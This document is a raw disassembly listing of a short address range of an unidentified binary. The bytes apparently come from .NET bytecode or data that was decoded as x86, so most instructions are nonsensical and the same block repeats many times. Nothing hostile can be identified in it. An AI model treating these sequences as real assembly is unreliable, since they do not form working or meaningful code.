  4038ff:	mov    ecx,0x180a0000
  403904:	adc    BYTE PTR cs:[edx-0x79],dh
  403908:	add    al,0x0
  40390a:	jo     0x40397f
  40390c:	scas   eax,DWORD PTR es:[edi]
  40390d:	add    BYTE PTR [eax],al
  40390f:	or     ch,BYTE PTR [eax]
  403911:	mov    al,0x0
  403913:	add    BYTE PTR [edx],cl
  403915:	add    ebp,DWORD PTR es:[edi+0x3f]
  403919:	add    BYTE PTR [eax],al
  40391b:	or     al,BYTE PTR [edi+ebp*2]
  40391e:	inc    esi
  40391f:	add    BYTE PTR [eax],al
  403921:	or     ch,BYTE PTR [eax]
  403923:	mov    ebx,0xa0a0000
  403928:	add    ch,BYTE PTR [eax]
  40392a:	dec    esp
  40392b:	add    BYTE PTR [eax],al
  40392d:	push   es
  40392e:	add    eax,DWORD PTR [edx+eax*1]
  403931:	add    al,0x28
  403933:	push   edx
  403934:	add    BYTE PTR [eax],al
  403936:	push   es
  403937:	sub    BYTE PTR [eax+eax*1+0x6f030a00],bh
  40393e:	aas    
  40393f:	add    BYTE PTR [eax],al
  403941:	or     al,BYTE PTR [esi]
  403943:	add    ebp,DWORD PTR [edi-0x43]
  403946:	add    BYTE PTR [eax],al
  403948:	or     al,BYTE PTR [ebx]
  40394a:	outs   dx,DWORD PTR ds:[esi]
  40394b:	mov    esi,0x6f0a0000
  403950:	mov    edi,0xb0a0000
  403955:	fimul  WORD PTR [esp+ecx*1+0x8]
  403959:	jne    0x40395d
  40395b:	add    BYTE PTR [eax],al
  40395d:	sbb    ebp,DWORD PTR [ecx+eax*2]
  403960:	or     BYTE PTR [ebp+0x2],dh
  403963:	add    BYTE PTR [eax],al
  403965:	sbb    ecx,DWORD PTR ds:0x4c6f09
  40396b:	add    BYTE PTR [edx],cl
  40396d:	outs   dx,DWORD PTR ds:[esi]
  40396e:	dec    ebp
  40396f:	add    BYTE PTR [eax],al
  403971:	or     dl,BYTE PTR [ebx]
  403973:	add    al,0x11
  403975:	add    al,0x1f
  403977:	or     ebp,DWORD PTR [esi]
  403979:	or     al,0x11
  40397b:	add    al,0x1f
  40397d:	or     al,0x2e
  40397f:	push   es
  403980:	adc    DWORD PTR [edi+ebx*1],eax
  403983:	or     eax,0x72081b33
  403988:	push   ss
  403989:	add    eax,0x1b287000
  40398e:	add    BYTE PTR [eax],al
  403990:	or     ch,BYTE PTR [eax]
  403992:	xchg   edx,eax
  403993:	add    BYTE PTR [eax],al
  403995:	push   es
  403996:	sub    BYTE PTR [esi],dl
  403998:	add    BYTE PTR [eax],al
  40399a:	or     bl,BYTE PTR [edi]
  40399c:	or     al,0x13
  40399e:	or     esi,ebx
  4039a0:	push   0xfffffffe
  4039a2:	sbb    dl,BYTE PTR [ebx+edx*1]
  4039a5:	add    eax,0xc06f04
  4039aa:	add    BYTE PTR [edx],cl
  4039ac:	adc    eax,DWORD PTR ds:0x61328de
  4039b2:	adc    DWORD PTR [esi],eax
  4039b4:	jb     0x4039fc
  4039b6:	add    eax,0x1b287000
  4039bb:	add    BYTE PTR [eax],al
  4039bd:	or     al,BYTE PTR [edx]
  4039bf:	sub    BYTE PTR [eax+eax*1+0x0],cl
  4039c3:	push   es
  4039c4:	outs   dx,DWORD PTR ds:[esi]
  4039c5:	dec    ecx
  4039c6:	add    BYTE PTR [eax],al
  4039c8:	or     ch,BYTE PTR [eax]
  4039ca:	ja     0x4039cc
  4039cc:	add    BYTE PTR [esi],al
  4039ce:	sub    BYTE PTR [esi],dl
  4039d0:	add    BYTE PTR [eax],al
  4039d2:	or     dl,BYTE PTR [edi]
  4039d4:	adc    ecx,DWORD PTR [ecx]
  4039d6:	fidiv  WORD PTR [ebx]
  4039d8:	pop    es
  4039d9:	outs   dx,DWORD PTR ds:[esi]
  4039da:	rol    DWORD PTR [eax],0x0
  4039dd:	or     dh,BYTE PTR [ebx-0x3e]
  4039e0:	add    BYTE PTR [eax],al
  4039e2:	or     dl,BYTE PTR [ebx]
  4039e4:	pop    es
  4039e5:	add    eax,DWORD PTR [ecx+edx*1]
  4039e8:	pop    es
  4039e9:	push   es
  4039ea:	adc    DWORD PTR ds:0x426f,eax
  4039f0:	or     ch,BYTE PTR [eax]
  4039f2:	ret    
  4039f3:	add    BYTE PTR [eax],al
  4039f5:	or     dl,BYTE PTR [ebx]
  4039f7:	or     BYTE PTR [eax],ch
  4039f9:	arpl   WORD PTR [eax],ax
  4039fb:	add    BYTE PTR [esi],al
  4039fd:	adc    DWORD PTR [eax],ecx
  4039ff:	outs   dx,DWORD PTR ds:[esi]
  403a00:	ja     0x403a02
  403a02:	add    BYTE PTR [edx],cl
  403a04:	sub    BYTE PTR [ecx],bl
  403a06:	add    BYTE PTR [eax],al
  403a08:	or     dl,BYTE PTR [esi]
  403a0a:	sub    dl,BYTE PTR [ecx]
  403a0c:	or     DWORD PTR [edx],ebp
  403a0e:	add    BYTE PTR [eax],al
  403a10:	add    DWORD PTR [eax+eax*1],ebx
  403a13:	add    BYTE PTR [eax],al
  403a15:	add    BYTE PTR [eax],bh
  403a17:	add    BYTE PTR [edi],ch
  403a19:	add    BYTE PTR [si+0x31],cl
  403a1d:	add    BYTE PTR [eax],al
  403a1f:	add    DWORD PTR [eax],eax
  403a21:	add    BYTE PTR [esi+0xc00a00],dh
  403a27:	sub    BYTE PTR [ecx],dh
  403a29:	add    BYTE PTR [eax],al
  403a2b:	add    DWORD PTR [ebx],edx
  403a2d:	xor    BYTE PTR [edx],al
  403a2f:	add    BYTE PTR ds:0x19000000,ch
  403a35:	add    BYTE PTR [eax],al
  403a37:	adc    DWORD PTR [ebx],eax
  403a39:	jne    0x403a79
  403a3b:	add    BYTE PTR [eax],al
  403a3d:	add    DWORD PTR [esi+ebx*1],ebp
  403a40:	add    ch,BYTE PTR [eax]
  403a42:	dec    esp
  403a43:	add    BYTE PTR [eax],al
  403a45:	push   es
  403a46:	add    esi,DWORD PTR [ebp+0x3e]
  403a49:	add    BYTE PTR [eax],al
  403a4b:	add    DWORD PTR [edi+0x47],ebp
  403a4e:	add    BYTE PTR [eax],al
  403a50:	or     ch,BYTE PTR [edi-0x3c]
  403a53:	add    BYTE PTR [eax],al
  403a55:	or     cl,BYTE PTR [edx]
  403a57:	push   es
  403a58:	sub    ch,al
  403a5a:	add    BYTE PTR [eax],al
  403a5c:	or     ch,BYTE PTR [edx]
  403a5e:	add    ebp,DWORD PTR [edi-0x3a]
  403a61:	add    BYTE PTR [eax],al
  403a63:	or     ch,BYTE PTR [edx]
  403a65:	push   ds
  403a66:	add    ch,BYTE PTR [eax]
  403a68:	dec    edx
  403a69:	add    BYTE PTR [eax],al
  403a6b:	or     ch,BYTE PTR [edx]
  403a6d:	add    BYTE PTR [eax],al
  403a6f:	add    BYTE PTR [ebx],dl
  403a71:	xor    BYTE PTR [edx],al
  403a73:	add    BYTE PTR [ebx],dh
  403a75:	add    BYTE PTR [eax],al
  403a77:	add    BYTE PTR [edx],bl
  403a79:	add    BYTE PTR [eax],al
  403a7b:	adc    DWORD PTR [esi+0x32],edi
  403a7e:	add    BYTE PTR [eax],al
  403a80:	add    al,0x14
  403a82:	sub    cl,cl
  403a84:	add    BYTE PTR [eax],al
  403a86:	or     ch,BYTE PTR [eax+eiz*1]
  403a89:	jb     0x403aff
  403a8b:	add    eax,0xfd07000
  403a90:	add    BYTE PTR [eax],al
  403a92:	add    ch,BYTE PTR [eax]
  403a94:	retf   0x0
  403a97:	or     ch,BYTE PTR [edi-0x35]
  403a9a:	add    BYTE PTR [eax],al
  403a9c:	or     dh,BYTE PTR [ebx-0x34]
  403a9f:	add    BYTE PTR [eax],al
  403aa1:	or     cl,BYTE PTR [edx]
  403aa3:	push   es
  403aa4:	xor    BYTE PTR [edx],0x0
  403aa7:	add    BYTE PTR [esi+edi*2],al
  403aaa:	xor    al,BYTE PTR [eax]
  403aac:	add    BYTE PTR [edx+ebp*1],al
  403aaf:	sbb    bh,BYTE PTR [esi+0x33]
  403ab2:	add    BYTE PTR [eax],al
  403ab4:	add    al,0x2a
  403ab6:	push   ds
  403ab7:	add    al,BYTE PTR [eax+0x4000033]
  403abd:	sub    dl,BYTE PTR [esi+0x28]
  403ac0:	push   esp
  403ac1:	add    BYTE PTR [eax],al
  403ac3:	push   es
  403ac4:	jb     0x403aac
  403ac6:	add    eax,0x337e7000
  403acb:	add    BYTE PTR [eax],al
  403acd:	add    al,0x6f
  403acf:	int    0x0
  403ad1:	add    BYTE PTR [edx],cl
  403ad3:	sub    dl,BYTE PTR [esi+0x28]
  403ad6:	push   esp
  403ad7:	add    BYTE PTR [eax],al
  403ad9:	push   es
  403ada:	jb     0x403b02
  403adc:	push   es
  403add:	add    BYTE PTR [eax+0x7e],dh
  403ae0:	xor    eax,DWORD PTR [eax]
  403ae2:	add    BYTE PTR [edi+ebp*2],al
  403ae5:	int    0x0
  403ae7:	add    BYTE PTR [edx],cl
  403ae9:	sub    dl,BYTE PTR [esi+0x28]
  403aec:	push   esp
  403aed:	add    BYTE PTR [eax],al
  403aef:	push   es
  403af0:	jb     0x403b38
  403af2:	push   es
  403af3:	add    BYTE PTR [eax+0x7e],dh
  403af6:	xor    eax,DWORD PTR [eax]
  403af8:	add    BYTE PTR [edi+ebp*2],al
  403afb:	int    0x0
  403afd:	add    BYTE PTR [edx],cl
  403aff:	sub    dl,BYTE PTR [esi+0x28]
  403b02:	push   esp
  403b03:	add    BYTE PTR [eax],al
  403b05:	push   es
  403b06:	jb     0x403b86
  403b08:	push   es
  403b09:	add    BYTE PTR [eax+0x7e],dh
  403b0c:	xor    eax,DWORD PTR [eax]
  403b0e:	add    BYTE PTR [edi+ebp*2],al
  403b11:	int    0x0
  403b13:	add    BYTE PTR [edx],cl
  403b15:	sub    dl,BYTE PTR [esi+0x28]
  403b18:	push   esp
  403b19:	add    BYTE PTR [eax],al
  403b1b:	push   es
  403b1c:	jb     0x403ad8
  403b1e:	push   es
  403b1f:	add    BYTE PTR [eax+0x7e],dh
  403b22:	xor    eax,DWORD PTR [eax]
  403b24:	add    BYTE PTR [edi+ebp*2],al
  403b27:	int    0x0
  403b29:	add    BYTE PTR [edx],cl
  403b2b:	sub    dl,BYTE PTR [esi+0x28]
  403b2e:	push   esp
  403b2f:	add    BYTE PTR [eax],al
  403b31:	push   es
  403b32:	jb     0x403b20
  403b34:	push   es
  403b35:	add    BYTE PTR [eax+0x7e],dh
  403b38:	xor    eax,DWORD PTR [eax]
  403b3a:	add    BYTE PTR [edi+ebp*2],al
  403b3d:	int    0x0
  403b3f:	add    BYTE PTR [edx],cl
  403b41:	sub    dl,BYTE PTR [esi+0x28]
  403b44:	push   esp
  403b45:	add    BYTE PTR [eax],al
  403b47:	push   es
  403b48:	jb     0x403b82
  403b4a:	pop    es
  403b4b:	add    BYTE PTR [eax+0x7e],dh
  403b4e:	xor    eax,DWORD PTR [eax]
  403b50:	add    BYTE PTR [edi+ebp*2],al
  403b53:	int    0x0
  403b55:	add    BYTE PTR [edx],cl
  403b57:	sub    dl,BYTE PTR [esi+0x28]
  403b5a:	push   esp
  403b5b:	add    BYTE PTR [eax],al
  403b5d:	push   es
  403b5e:	jb     0x403bde
  403b60:	pop    es
  403b61:	add    BYTE PTR [eax+0x7e],dh
  403b64:	xor    eax,DWORD PTR [eax]
  403b66:	add    BYTE PTR [edi+ebp*2],al
  403b69:	int    0x0
  403b6b:	add    BYTE PTR [edx],cl
  403b6d:	sub    dl,BYTE PTR [esi+0x28]
  403b70:	push   esp
  403b71:	add    BYTE PTR [eax],al
  403b73:	push   es
  403b74:	jb     0x403b14
  403b76:	pop    es
  403b77:	add    BYTE PTR [eax+0x7e],dh
  403b7a:	xor    eax,DWORD PTR [eax]
  403b7c:	add    BYTE PTR [edi+ebp*2],al
  403b7f:	int    0x0
  403b81:	add    BYTE PTR [edx],cl
  403b83:	sub    dl,BYTE PTR [esi+0x28]
  403b86:	push   esp
  403b87:	add    BYTE PTR [eax],al
  403b89:	push   es
  403b8a:	jb     0x403b5e
  403b8c:	pop    es
  403b8d:	add    BYTE PTR [eax+0x7e],dh
  403b90:	xor    eax,DWORD PTR [eax]
  403b92:	add    BYTE PTR [edi+ebp*2],al
  403b95:	int    0x0
  403b97:	add    BYTE PTR [edx],cl
  403b99:	sub    dl,BYTE PTR [esi+0x28]
  403b9c:	push   esp
  403b9d:	add    BYTE PTR [eax],al
  403b9f:	push   es
  403ba0:	jb     0x403b90
  403ba2:	pop    es
  403ba3:	add    BYTE PTR [eax+0x7e],dh
  403ba6:	xor    eax,DWORD PTR [eax]
  403ba8:	add    BYTE PTR [edi+ebp*2],al
  403bab:	int    0x0
  403bad:	add    BYTE PTR [edx],cl
  403baf:	sub    dl,BYTE PTR [esi+0x28]
  403bb2:	push   esp
  403bb3:	add    BYTE PTR [eax],al
  403bb5:	push   es
  403bb6:	jb     0x403bd4
  403bb8:	or     BYTE PTR [eax],al
  403bba:	jo     0x403c3a
  403bbc:	xor    eax,DWORD PTR [eax]
  403bbe:	add    BYTE PTR [edi+ebp*2],al
  403bc1:	int    0x0
  403bc3:	add    BYTE PTR [edx],cl
  403bc5:	sub    dl,BYTE PTR [esi+0x28]
  403bc8:	push   esp
  403bc9:	add    BYTE PTR [eax],al
  403bcb:	push   es
  403bcc:	jb     0x403c14
  403bce:	or     BYTE PTR [eax],al
  403bd0:	jo     0x403c50
  403bd2:	xor    eax,DWORD PTR [eax]
  403bd4:	add    BYTE PTR [edi+ebp*2],al
  403bd7:	int    0x0
  403bd9:	add    BYTE PTR [edx],cl
  403bdb:	sub    dl,BYTE PTR [esi+0x28]
  403bde:	push   esp
  403bdf:	add    BYTE PTR [eax],al
  403be1:	push   es
  403be2:	jb     0x403c5c
  403be4:	or     BYTE PTR [eax],al
  403be6:	jo     0x403c66
  403be8:	xor    eax,DWORD PTR [eax]
  403bea:	add    BYTE PTR [edi+ebp*2],al
  403bed:	int    0x0
  403bef:	add    BYTE PTR [edx],cl
  403bf1:	sub    dl,BYTE PTR [esi+0x28]
  403bf4:	push   esp
  403bf5:	add    BYTE PTR [eax],al
  403bf7:	push   es
  403bf8:	jb     0x403b90
  403bfa:	or     BYTE PTR [eax],al
  403bfc:	jo     0x403c7c
  403bfe:	xor    eax,DWORD PTR [eax]
  403c00:	add    BYTE PTR [edi+ebp*2],al
  403c03:	int    0x0
  403c05:	add    BYTE PTR [edx],cl
  403c07:	sub    dl,BYTE PTR [esi+0x28]
  403c0a:	push   esp
  403c0b:	add    BYTE PTR [eax],al
  403c0d:	push   es
  403c0e:	jb     0x403bc2
  403c10:	or     BYTE PTR [eax],al
  403c12:	jo     0x403c92
  403c14:	xor    eax,DWORD PTR [eax]
  403c16:	add    BYTE PTR [edi+ebp*2],al
  403c19:	int    0x0
  403c1b:	add    BYTE PTR [edx],cl
  403c1d:	sub    dl,BYTE PTR [esi+0x28]
  403c20:	push   esp
  403c21:	add    BYTE PTR [eax],al
  403c23:	push   es
  403c24:	jb     0x403bf4
  403c26:	or     BYTE PTR [eax],al
  403c28:	jo     0x403ca8
  403c2a:	xor    eax,DWORD PTR [eax]
  403c2c:	add    BYTE PTR [edi+ebp*2],al
  403c2f:	int    0x0
  403c31:	add    BYTE PTR [edx],cl
  403c33:	sub    dl,BYTE PTR [esi+0x28]
  403c36:	push   esp
  403c37:	add    BYTE PTR [eax],al
  403c39:	push   es
  403c3a:	jb     0x403c26
  403c3c:	or     BYTE PTR [eax],al
  403c3e:	jo     0x403cbe
  403c40:	xor    eax,DWORD PTR [eax]
  403c42:	add    BYTE PTR [edi+ebp*2],al
  403c45:	int    0x0
  403c47:	add    BYTE PTR [edx],cl
  403c49:	sub    dl,BYTE PTR [esi+0x28]
  403c4c:	push   esp
  403c4d:	add    BYTE PTR [eax],al
  403c4f:	push   es
  403c50:	jb     0x403c58
  403c52:	or     DWORD PTR [eax],eax
  403c54:	jo     0x403cd4
  403c56:	xor    eax,DWORD PTR [eax]
  403c58:	add    BYTE PTR [edi+ebp*2],al
  403c5b:	int    0x0
  403c5d:	add    BYTE PTR [edx],cl
  403c5f:	sub    dl,BYTE PTR [esi+0x28]
  403c62:	push   esp
  403c63:	add    BYTE PTR [eax],al
  403c65:	push   es
  403c66:	jb     0x403c92
  403c68:	or     DWORD PTR [eax],eax
  403c6a:	jo     0x403cea
  403c6c:	xor    eax,DWORD PTR [eax]
  403c6e:	add    BYTE PTR [edi+ebp*2],al
  403c71:	int    0x0
  403c73:	add    BYTE PTR [edx],cl
  403c75:	sub    dl,BYTE PTR [esi+0x28]
  403c78:	push   esp
  403c79:	add    BYTE PTR [eax],al
  403c7b:	push   es
  403c7c:	jb     0x403cc4
  403c7e:	or     DWORD PTR [eax],eax
  403c80:	jo     0x403d00
  403c82:	xor    eax,DWORD PTR [eax]
  403c84:	add    BYTE PTR [edi+ebp*2],al
  403c87:	int    0x0
  403c89:	add    BYTE PTR [edx],cl
  403c8b:	sub    dl,BYTE PTR [esi+0x28]
  403c8e:	push   esp
  403c8f:	add    BYTE PTR [eax],al
  403c91:	push   es
  403c92:	jb     0x403cf8
  403c94:	or     DWORD PTR [eax],eax
  403c96:	jo     0x403d16
  403c98:	xor    eax,DWORD PTR [eax]
  403c9a:	add    BYTE PTR [edi+ebp*2],al
  403c9d:	int    0x0
  403c9f:	add    BYTE PTR [edx],cl
  403ca1:	sub    dl,BYTE PTR [esi+0x28]
  403ca4:	push   esp
  403ca5:	add    BYTE PTR [eax],al
  403ca7:	push   es
  403ca8:	jb     0x403d28
  403caa:	or     DWORD PTR [eax],eax
  403cac:	jo     0x403d2c
  403cae:	xor    eax,DWORD PTR [eax]
  403cb0:	add    BYTE PTR [edi+ebp*2],al
  403cb3:	int    0x0
  403cb5:	add    BYTE PTR [edx],cl
  403cb7:	sub    dl,BYTE PTR [esi+0x28]
  403cba:	push   esp
  403cbb:	add    BYTE PTR [eax],al
  403cbd:	push   es
  403cbe:	jb     0x403c7a
  403cc0:	or     DWORD PTR [eax],eax
  403cc2:	jo     0x403d42
  403cc4:	xor    eax,DWORD PTR [eax]
  403cc6:	add    BYTE PTR [edi+ebp*2],al
  403cc9:	int    0x0
  403ccb:	add    BYTE PTR [edx],cl
  403ccd:	sub    dl,BYTE PTR [esi+0x28]
  403cd0:	push   esp
  403cd1:	add    BYTE PTR [eax],al
  403cd3:	push   es
  403cd4:	jb     0x403cbe
  403cd6:	or     DWORD PTR [eax],eax
  403cd8:	jo     0x403d58
  403cda:	xor    eax,DWORD PTR [eax]
  403cdc:	add    BYTE PTR [edi+ebp*2],al
  403cdf:	int    0x0
  403ce1:	add    BYTE PTR [edx],cl
  403ce3:	sub    dl,BYTE PTR [esi+0x28]
  403ce6:	push   esp
  403ce7:	add    BYTE PTR [eax],al
  403ce9:	push   es
  403cea:	jb     0x403cfc
  403cec:	or     al,BYTE PTR [eax]
  403cee:	jo     0x403d6e
  403cf0:	xor    eax,DWORD PTR [eax]
  403cf2:	add    BYTE PTR [edi+ebp*2],al
  403cf5:	int    0x0
  403cf7:	add    BYTE PTR [edx],cl
  403cf9:	sub    dl,BYTE PTR [esi+0x28]
  403cfc:	push   esp
  403cfd:	add    BYTE PTR [eax],al
  403cff:	push   es
  403d00:	jb     0x403d3c
  403d02:	or     al,BYTE PTR [eax]
  403d04:	jo     0x403d84
  403d06:	xor    eax,DWORD PTR [eax]
  403d08:	add    BYTE PTR [edi+ebp*2],al
  403d0b:	int    0x0
  403d0d:	add    BYTE PTR [edx],cl
  403d0f:	sub    dl,BYTE PTR [esi+0x28]
  403d12:	push   esp
  403d13:	add    BYTE PTR [eax],al
  403d15:	push   es
  403d16:	jb     0x403d68
  403d18:	or     al,BYTE PTR [eax]
  403d1a:	jo     0x403d9a
  403d1c:	xor    eax,DWORD PTR [eax]
  403d1e:	add    BYTE PTR [edi+ebp*2],al
  403d21:	int    0x0
  403d23:	add    BYTE PTR [edx],cl
  403d25:	sub    dl,BYTE PTR [esi+0x28]
  403d28:	push   esp
  403d29:	add    BYTE PTR [eax],al
  403d2b:	push   es
  403d2c:	jb     0x403cbe
  403d2e:	or     al,BYTE PTR [eax]
  403d30:	jo     0x403db0
  403d32:	xor    eax,DWORD PTR [eax]
  403d34:	add    BYTE PTR [edi+ebp*2],al
  403d37:	int    0x0
  403d39:	add    BYTE PTR [edx],cl
  403d3b:	sub    dl,BYTE PTR [esi+0x28]
  403d3e:	push   esp
  403d3f:	add    BYTE PTR [eax],al
  403d41:	push   es
  403d42:	jb     0x403cfa
  403d44:	or     al,BYTE PTR [eax]
  403d46:	jo     0x403dc6
  403d48:	xor    eax,DWORD PTR [eax]
  403d4a:	add    BYTE PTR [edi+ebp*2],al
  403d4d:	int    0x0
  403d4f:	add    BYTE PTR [edx],cl
  403d51:	sub    dl,BYTE PTR [esi+0x28]
  403d54:	push   esp
  403d55:	add    BYTE PTR [eax],al
  403d57:	push   es
  403d58:	jb     0x403d3e
  403d5a:	or     al,BYTE PTR [eax]
  403d5c:	jo     0x403ddc
  403d5e:	xor    eax,DWORD PTR [eax]
  403d60:	add    BYTE PTR [edi+ebp*2],al
  403d63:	int    0x0
  403d65:	add    BYTE PTR [edx],cl
  403d67:	sub    dl,BYTE PTR [esi+0x28]
  403d6a:	push   esp
  403d6b:	add    BYTE PTR [eax],al
  403d6d:	push   es
  403d6e:	jb     0x403d7e
  403d70:	or     eax,DWORD PTR [eax]
  403d72:	jo     0x403df2
  403d74:	xor    eax,DWORD PTR [eax]
  403d76:	add    BYTE PTR [edi+ebp*2],al
  403d79:	int    0x0
  403d7b:	add    BYTE PTR [edx],cl
  403d7d:	sub    dl,BYTE PTR [esi+0x28]
  403d80:	push   esp
  403d81:	add    BYTE PTR [eax],al
  403d83:	push   es
  403d84:	jb     0x403dbe
  403d86:	or     eax,DWORD PTR [eax]
  403d88:	jo     0x403e08
  403d8a:	xor    eax,DWORD PTR [eax]
  403d8c:	add    BYTE PTR [edi+ebp*2],al
  403d8f:	int    0x0
  403d91:	add    BYTE PTR [edx],cl
  403d93:	sub    dl,BYTE PTR [esi+0x28]
  403d96:	push   esp
  403d97:	add    BYTE PTR [eax],al
  403d99:	push   es
  403d9a:	jb     0x403e08
  403d9c:	or     eax,DWORD PTR [eax]
  403d9e:	jo     0x403e1e
  403da0:	xor    eax,DWORD PTR [eax]
  403da2:	add    BYTE PTR [edi+ebp*2],al
  403da5:	int    0x0
  403da7:	add    BYTE PTR [edx],cl
  403da9:	sub    dl,BYTE PTR [esi+0x28]
  403dac:	push   esp
  403dad:	add    BYTE PTR [eax],al
  403daf:	push   es
  403db0:	jb     0x403d48
  403db2:	or     eax,DWORD PTR [eax]
  403db4:	jo     0x403e34
  403db6:	xor    eax,DWORD PTR [eax]
  403db8:	add    BYTE PTR [edi+ebp*2],al
  403dbb:	int    0x0
  403dbd:	add    BYTE PTR [edx],cl
  403dbf:	sub    dl,BYTE PTR [esi+0x28]
  403dc2:	push   esp
  403dc3:	add    BYTE PTR [eax],al
  403dc5:	push   es
  403dc6:	jb     0x403d8e
  403dc8:	or     eax,DWORD PTR [eax]
  403dca:	jo     0x403e4a
  403dcc:	xor    eax,DWORD PTR [eax]
  403dce:	add    BYTE PTR [edi+ebp*2],al
  403dd1:	int    0x0
  403dd3:	add    BYTE PTR [edx],cl
  403dd5:	sub    dl,BYTE PTR [esi+0x28]
  403dd8:	push   esp
  403dd9:	add    BYTE PTR [eax],al
  403ddb:	push   es
  403ddc:	jb     0x403dd4
  403dde:	or     eax,DWORD PTR [eax]
  403de0:	jo     0x403e60
  403de2:	xor    eax,DWORD PTR [eax]
  403de4:	add    BYTE PTR [edi+ebp*2],al
  403de7:	int    0x0
  403de9:	add    BYTE PTR [edx],cl
  403deb:	sub    dl,BYTE PTR [esi+0x28]
  403dee:	push   esp
  403def:	add    BYTE PTR [eax],al
  403df1:	push   es
  403df2:	jb     0x403e18
  403df4:	or     al,0x0
  403df6:	jo     0x403e76
  403df8:	xor    eax,DWORD PTR [eax]
  403dfa:	add    BYTE PTR [edi+ebp*2],al
  403dfd:	int    0x0
  403dff:	add    BYTE PTR [edx],cl
  403e01:	sub    dl,BYTE PTR [esi+0x28]
  403e04:	push   esp
  403e05:	add    BYTE PTR [eax],al
  403e07:	push   es
  403e08:	jb     0x403e5c
  403e0a:	or     al,0x0
  403e0c:	jo     0x403e8c
  403e0e:	xor    eax,DWORD PTR [eax]
  403e10:	add    BYTE PTR [edi+ebp*2],al
  403e13:	int    0x0
  403e15:	add    BYTE PTR [edx],cl
  403e17:	sub    dl,BYTE PTR [esi+0x28]
  403e1a:	push   esp
  403e1b:	add    BYTE PTR [eax],al
  403e1d:	push   es
  403e1e:	jb     0x403da0
  403e20:	or     al,0x0
  403e22:	jo     0x403ea2
  403e24:	xor    eax,DWORD PTR [eax]
  403e26:	add    BYTE PTR [edi+ebp*2],al
  403e29:	int    0x0
  403e2b:	add    BYTE PTR [edx],cl
  403e2d:	sub    dl,BYTE PTR [esi+0x28]
  403e30:	push   esp
  403e31:	add    BYTE PTR [eax],al
  403e33:	push   es
  403e34:	jb     0x403de4
  403e36:	or     al,0x0
  403e38:	jo     0x403eb8
  403e3a:	xor    eax,DWORD PTR [eax]
  403e3c:	add    BYTE PTR [edi+ebp*2],al
  403e3f:	int    0x0
  403e41:	add    BYTE PTR [edx],cl
  403e43:	sub    dl,BYTE PTR [esi+0x28]
  403e46:	push   esp
  403e47:	add    BYTE PTR [eax],al
  403e49:	push   es
  403e4a:	jb     0x403e30
  403e4c:	or     al,0x0
  403e4e:	jo     0x403ece
  403e50:	xor    eax,DWORD PTR [eax]
  403e52:	add    BYTE PTR [edi+ebp*2],al
  403e55:	int    0x0
  403e57:	add    BYTE PTR [edx],cl
  403e59:	sub    dl,BYTE PTR [esi+0x28]
  403e5c:	push   esp
  403e5d:	add    BYTE PTR [eax],al
  403e5f:	push   es
  403e60:	jb     0x403e74
  403e62:	or     eax,0x337e7000
  403e67:	add    BYTE PTR [eax],al
  403e69:	add    al,0x6f
  403e6b:	int    0x0
  403e6d:	add    BYTE PTR [edx],cl
  403e6f:	sub    dl,BYTE PTR [esi+0x28]
  403e72:	push   esp
  403e73:	add    BYTE PTR [eax],al
  403e75:	push   es
  403e76:	jb     0x403eba
  403e78:	or     eax,0x337e7000
  403e7d:	add    BYTE PTR [eax],al
  403e7f:	add    al,0x6f
  403e81:	int    0x0
  403e83:	add    BYTE PTR [edx],cl
  403e85:	sub    dl,BYTE PTR [esi+0x28]
  403e88:	push   esp
  403e89:	add    BYTE PTR [eax],al
  403e8b:	push   es
  403e8c:	jb     0x403efc
  403e8e:	or     eax,0x337e7000
  403e93:	add    BYTE PTR [eax],al
  403e95:	add    al,0x6f
  403e97:	int    0x0
  403e99:	add    BYTE PTR [edx],cl
  403e9b:	sub    dl,BYTE PTR [esi+0x28]
  403e9e:	push   esp
  403e9f:	add    BYTE PTR [eax],al
  403ea1:	push   es
  403ea2:	jb     0x403e3e
  403ea4:	or     eax,0x337e7000
  403ea9:	add    BYTE PTR [eax],al
  403eab:	add    al,0x6f
  403ead:	int    0x0
  403eaf:	add    BYTE PTR [edx],cl
  403eb1:	sub    dl,BYTE PTR [esi+0x28]
  403eb4:	push   esp
  403eb5:	add    BYTE PTR [eax],al
  403eb7:	push   es
  403eb8:	jb     0x403e7e
  403eba:	or     eax,0x337e7000
  403ebf:	add    BYTE PTR [eax],al
  403ec1:	add    al,0x6f
  403ec3:	int    0x0
  403ec5:	add    BYTE PTR [edx],cl
  403ec7:	sub    dl,BYTE PTR [esi+0x28]
  403eca:	push   esp
  403ecb:	add    BYTE PTR [eax],al
  403ecd:	push   es
  403ece:	jb     0x403ebe
  403ed0:	or     eax,0x337e7000
  403ed5:	add    BYTE PTR [eax],al
  403ed7:	add    al,0x6f
  403ed9:	int    0x0
  403edb:	add    BYTE PTR [edx],cl
  403edd:	sub    dl,BYTE PTR [esi+0x28]
  403ee0:	push   esp
  403ee1:	add    BYTE PTR [eax],al
  403ee3:	push   es
  403ee4:	jb     0x403f06
  403ee6:	push   cs
  403ee7:	add    BYTE PTR [eax+0x7e],dh
  403eea:	xor    eax,DWORD PTR [eax]
  403eec:	add    BYTE PTR [edi+ebp*2],al
  403eef:	int    0x0
  403ef1:	add    BYTE PTR [edx],cl
  403ef3:	sub    dl,BYTE PTR [esi+0x28]
  403ef6:	push   esp
  403ef7:	add    BYTE PTR [eax],al
  403ef9:	push   es
  403efa:	jb     0x403f46
  403efc:	push   cs
  403efd:	add    BYTE PTR [eax+0x7e],dh
  403f00:	xor    eax,DWORD PTR [eax]
  403f02:	add    BYTE PTR [edi+ebp*2],al
  403f05:	int    0x0
  403f07:	add    BYTE PTR [edx],cl
  403f09:	sub    dl,BYTE PTR [esi+0x28]
  403f0c:	push   esp
  403f0d:	add    BYTE PTR [eax],al
  403f0f:	push   es
  403f10:	jb     0x403f88
  403f12:	push   cs
  403f13:	add    BYTE PTR [eax+0x7e],dh
  403f16:	xor    eax,DWORD PTR [eax]
  403f18:	add    BYTE PTR [edi+ebp*2],al
  403f1b:	int    0x0
  403f1d:	add    BYTE PTR [edx],cl
  403f1f:	sub    dl,BYTE PTR [esi+0x28]
  403f22:	push   esp
  403f23:	add    BYTE PTR [eax],al
  403f25:	push   es
  403f26:	jb     0x403eca
  403f28:	push   cs
  403f29:	add    BYTE PTR [eax+0x7e],dh
  403f2c:	xor    eax,DWORD PTR [eax]
  403f2e:	add    BYTE PTR [edi+ebp*2],al
  403f31:	int    0x0
  403f33:	add    BYTE PTR [edx],cl
  403f35:	sub    dl,BYTE PTR [esi+0x28]
  403f38:	push   esp
  403f39:	add    BYTE PTR [eax],al
  403f3b:	push   es
  403f3c:	jb     0x403f02
  403f3e:	push   cs
